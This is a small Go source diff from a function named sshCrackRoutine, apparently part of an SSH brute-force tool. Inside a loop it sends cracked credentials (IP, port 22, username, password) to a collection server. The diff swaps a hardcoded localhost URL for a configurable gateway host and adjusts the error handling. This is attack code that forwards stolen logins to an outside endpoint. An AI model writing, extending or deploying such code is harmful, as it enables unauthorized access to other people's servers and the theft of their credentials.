@@ -21,14 +21,15 @@ func sshCrackRoutine() {
 			continue
 		}
 		// Temp hardcoded.
-		err = submitCreds("http://127.0.0.1:60798", Creds{
+		err = submitCreds(gatewayHost, Creds{
 			Ip:   address,
 			Port: 22,
 			User: user,
 			Pass: pass,
 		})
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
+			continue
 		}
 	}
 }
